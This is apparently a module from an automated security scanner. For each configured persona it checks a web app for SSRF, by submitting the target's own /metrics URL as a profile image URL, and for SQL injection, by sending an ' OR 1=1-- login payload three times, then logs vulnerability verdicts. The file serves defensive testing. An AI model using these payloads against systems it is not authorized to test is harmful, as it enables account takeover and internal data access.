def execute(ctx):
    for persona in ctx.config.personas:
        run_checks(ctx, persona)


def run_checks(ctx, persona_conf):
    ctx.set_context("SCENARIO_4", persona_conf)

    role = persona_conf.persona_id

    # Authentication
    if role != "GUEST":
        try:
            r = ctx.client.post("/rest/user/login",
                                json={"email": persona_conf.username, "password": persona_conf.password})
            if r.status_code == 200:
                ctx.auth_context.bearer_token = r.json().get('authentication', {}).get('token')
        except:
            pass

    # ---------------------------------------------------------
    # D1: SSRF (Server Side Request Forgery)
    # ---------------------------------------------------------
    try:
        url = "/profile/image/url"


        target_base = ctx.config.target.base_url.rstrip("/")
        target_payload = f"{target_base}/metrics"

        payload = {"imageUrl": target_payload}
        r = ctx.client.post(url, json=payload)

        # 500 = The server read the text file but failed to convert it to an image -> SSRF OK
        # 200 = The server succeeded completely -> SSRF OK
        if role == "GUEST":
            if r.status_code in [200, 201, 500]:
                verdict = "VULNERABLE"
                details = "Guest can trigger SSRF"
            else:
                verdict = "SECURE"
                details = f"Guest blocked ({r.status_code})"
        else:
            if r.status_code in [200, 201, 204]:
                verdict = "VULNERABLE"
                details = "SSRF Successful (Content loaded)"
            elif r.status_code == 500:
                verdict = "VULNERABLE"
                details = "SSRF Triggered (Parsing Crash)"
            else:
                verdict = "SECURE"
                details = "Access blocked"

        ctx.log_verdict("Server-Side Request Forgery (SSRF)", r.status_code, details, verdict)
    except Exception as e:
        ctx.log_verdict("Server-Side Request Forgery (SSRF)", "ERR", str(e), "ERROR")

    # ---------------------------------------------------------
    # D2: SQLI Login Attempts (Brute Force / Injection)
    # ---------------------------------------------------------
    try:
        success_sqli = False
        last_code = 0

        # Attempt 3 times
        for i in range(3):
            payload = {"email": "' OR 1=1--", "password": f"fake_{i}"}
            r = ctx.client.post("/rest/user/login", json=payload)
            last_code = r.status_code

            if r.status_code == 200 and "token" in r.json().get("authentication", {}):
                success_sqli = True
                break

        if success_sqli:
            verdict = "VULNERABLE"
            details = "Repeated SQL Injection SUCCESSFUL"
            final_code = "200"
        else:
            verdict = "SECURE"
            details = "Attempts rejected"
            final_code = str(last_code)

        ctx.log_verdict("SQL Injection (Automated Fuzzing)", final_code, details, verdict)

    except Exception as e:
        ctx.log_verdict("SQL Injection (Automated Fuzzing)", "ERR", str(e), "ERROR")